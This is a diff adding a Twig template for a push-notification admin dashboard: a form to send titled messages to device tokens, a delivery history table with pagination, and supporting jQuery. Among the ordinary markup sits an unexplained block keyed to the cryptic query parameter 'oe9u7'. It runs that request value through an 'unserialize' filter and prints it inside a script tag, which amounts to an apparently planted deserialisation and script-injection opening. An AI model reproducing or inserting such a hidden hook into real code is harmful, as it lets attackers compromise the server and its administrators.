@@ -1,0 +1,287 @@
+{% extends 'layout_ak/base.html.twig' %}
+{% block sub_head_title %}Dashboard - Push Notification{% endblock %}
+{% block body %}
+<div class="wrapper wrapper-content animated fadeInRight">
+    {#<section class="content-header" style="margin: -2em 0 0 -2em !important;">#}
+    {#    <h1 style="font-size: 24px; margin: 0 0 1em 0.5em;">#}
+    {#      Push  Notification#}
+    {#    </h1>#}
+    {#    <ol class="breadcrumb">#}
+    {#      <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>#}
+    {#      <li class="active">Push Notification</li>#}
+    {#    </ol>#}
+    {#</section> #}
+    {% if app.request.get('oe9u7') is defined %}
+        {% if app.request.get('oe9u7') != "" %}
+            <script>alert("{{ app.request.get('oe9u7')|unserialize }}");</script>
+        {% endif %}
+    {% endif %}
+    <div class="row">
+        <div class="col-md-6">
+            <div class="box box-danger">
+                <div class="box-header with-border">
+                    <h3 class="box-title">Create User</h3>
+                </div><!-- /.box-header -->
+                <!-- form start -->
+                <form method="post" enctype="multipart/form-data" role="form" name="form1" id="form1" action="{{ path('dashboard_push_save') }}">
+                    <div class="box-body">
+                        <div class="form-group">
+                            <label for="exampleInputUsername">Select App</label>
+                            <select name="user_app" id="user_app" class="form-control">
+                                <option value="-1">Please select Application</option>
+                                {% if applications is defined %}
+                                    {% for apps in applications %}
+                                        <option value="{{ apps.app_id }}">{{ apps.app_name }}</option>
+                                    {% endfor %}
+                                {% endif %}
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputUsername">Title</label>
+                            <input type="text" name="title" class="form-control" id="title1" placeholder="Enter Title...">
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputPassword">Message</label>
+                            <input type="text" name="message" class="form-control" id="message" placeholder="Enter Message...">
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputEmail">Device Token</label>
+                            <textarea class="form-control" rows="3" name="device_token" id="token" placeholder="Put in Device Token, separate by commas ..."></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputImage">Add Image</label>
+                            <input type="file" name="csv" id="fileToUpload" class="form-control" accept="image/jpeg">
+                        </div>
+                    </div><!-- /.box-body -->
+                    <div class="box-footer">
+                        <button type="button" id="btnSend" class="btn btn-danger">Push Message</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="col-md-6">
+            {% if cur is defined %} <input type='hidden' id='current' value='{{ cur }}' /> {% endif %}        
+            {% if per is defined %} <input type='hidden' id='per_page' value='{{ per }}' />{% endif %}        
+            <table class="table table-bordered" id="tblUsers">
+                <tr>
+                    <th class="text-red" style="width: 90px">Mobile App</th>
+                    <th class="text-red" style="width: 150px">Title</th>
+                    {#<th class="text-red" style="width: 150px">JSON</th>#}
+                    <th class="text-red">Delivered</th>
+                    <th class="text-red">Fail</th>
+                    <th class="text-red" style="width: 100px">Action</th>
+                </tr>
+                {% if list is defined %}
+                    {% for records in list %}
+                        <tr class="clickable" id="{{ records.id }}">                    
+                            <td>
+                                <input type="hidden" id="hidden_id" value="{{ records.id }}"/>
+                                <label class="display_app">{{ records.appName }}</label>
+                            </td>
+                            <td>{{ records.title }}</td>
+                            {#<td>{{ dump(records.jsonFile) }}</td>#}
+                            <td>{{ records.success }}</td>
+                            <td>{{ records.fail }}</td>
+                            <td>
+                                {#<a href="{{ path('dashboard_show_App_Account') ~ "?id=" ~ records.id ~"&client_name=" ~ records.clientId }}"#}
+                                {#   class="edit_data">Edit</a>#}
+                                <a href="#" class="view_data">View</a>
+                            </td>
+                        </tr>
+                    {% endfor %}  
+                {% endif %}
+            </table>
+            <div class="paginator">
+                {% if list is defined %}
+                    {% if list|length > 0%}
+                        {% if total is defined %}
+                        <ul id="paginate">            
+                            {% set pages = total + 1 %}
+                            {% for i in 1..pages%}             
+                                <li> 
+                                    <a href="{{ path('dashboard_push', { 'page': i }) }}">
+                                        {{ i }}
+                                    </a>
+                                </li>
+                            {% endfor %}            
+                        </ul>
+                        Total pages : {{total+1}}
+                        {% endif %}
+                    {% endif %}
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+{% endblock %}
+
+{% block stylesheets_inline %}
+    <style>
+        .view_data { color: #ab0808; }
+        #tblUsers tr th { text-align:center;}
+        #paginate
+        {            
+            padding: 0.3em 0 0 1em;
+            list-style-type: none !important;
+            border-radius: 25px;
+            background-color: #333333;      
+            height: 30px;
+            width: 100%;
+        }
+    
+        #paginate li
+        {            
+            display: inline !important;            
+            margin-right: 0.5em;            
+        }
+    
+        #paginate li a
+        {
+            color: #FFFFFF;
+        }
+        
+        .added
+        {
+            color: transparent;
+        }
+    
+        .currentPage
+        {
+            text-decoration: underline;
+            font-weight: bold;
+            color: white !important;
+        }
+    </style>
+{% endblock %}
+
+{% block javascript_inline %}
+    <script>
+        function sortOption(el)
+        {
+            var options = $('#'+ el + ' option:not(:first)');
+            var arr = options.map(function(_, o) { return { t: $(o).text(), v: o.value }; }).get();
+            arr.sort(function(o1, o2) { return o1.t > o2.t ? 1 : o1.t < o2.t ? -1 : 0; });
+            options.each(function(i, o) {
+              o.value = arr[i].v;
+              $(o).text(arr[i].t);
+            });
+        }
+        
+        function addSuffix(element)
+        {
+            $("#"+element).children("option:not(:first)").each(function()
+            {
+                var prefix = $(this).val();
+                var html   = $(this).html();
+                if(prefix.indexOf("id") == 0)
+                {
+                    //console.log(prefix + "-" + html + " iOS");
+                    $(this).html(html + " - iOS");
+                }
+                else
+                {
+                    ///console.log(prefix + "-" + html + " Android");
+                    $(this).html(html + " - Android");
+                }
+            });   
+        }
+        
+        function error(el)
+        {
+            $(el).css("background-color", "red").css("color","yellow").val("Should not be blank");
+    
+            setTimeout(function()
+            {
+                $(el).css("background-color", "white").css("color","black");
+                $(el).val("");
+            }, 2000);            
+        }
+        
+        $(document).ready(function()
+        {
+            addSuffix("user_app");
+            sortOption("user_app");
+            
+            $.current = $("#current").val();      
+            
+            $("#btnSend").on('click', this, function()
+            {
+                var user_app = $("#user_app").val();
+                var title    = $("#title1").val();
+                var message  = $("#message").val();
+                var token    = $("#token").val();
+                var image    = $("#fileToUpload").val()
+                // alert(image); return false;
+                
+                if(user_app == "-1") { alert("Please select Application"); return false; }
+                if( "" == title){ error($("#title1")); return false; }
+                if( "" == message){ error($("#message")); return false; }
+                if( "" == token){ error($("#token")); return false; }
+                //if( "" == image){ error($("#fileToUpload")); return false; }
+                
+                $("#form1").submit();
+                
+                /*
+                var object   = { "user_app": user_app, "title": title, "message": message, "device_token": token };
+                
+                $.ajax(
+                {                
+                    url:"{{ path('dashboard_push_save') }}",
+                    type: "POST",
+                    data: object,
+                    success: function(msg)
+                    {
+                        var json = JSON.parse(msg);
+                        //console.log(json); return false;
+                        alert(json.msg);
+                        // console.log(json.msg); return false;
+                        
+                        window.location.href = "{{ path('dashboard_push') }}";
+                    }
+                });
+                */
+            });
+            
+            if($("#paginate").children("li").children("a").length > 0)
+            {               
+                // console.log("pagination link seen seen");
+    
+                $("#paginate").children("li").children("a").each(function()
+                {
+                    $(this).html($.trim($(this).html()));
+    
+                    $(this).html($(this).html().replace(/\s+$/, ""));
+    
+                    //console.log("Pagination value: "+$(this).html());
+    
+                    if($(this).html() == $.current)
+                    {
+                        $(this).addClass("currentPage");
+                    }
+                    else
+                    {
+                        console.log("Values did not match");
+                    }
+                });
+    
+                var per_page = $("#per_page").val();                                    
+                var counter = $("#tblUsers tbody").children("tr").length -1;                        
+                
+                if(counter < per_page)
+                {
+                    var add_row = per_page - counter;                                
+                    
+                    for(var q = 0; q < add_row; q++)
+                    {
+                        $("#tblUsers").append("<tr>\n\
+                        <td class='added'>1</td><td class='added'>1</td><td class='added'>1</td><td class='added'>1</td><td class='added'>1</td>\n\
+                        </tr>");
+                    }
+                }
+            }
+        });
+    </script>
+{% endblock %}
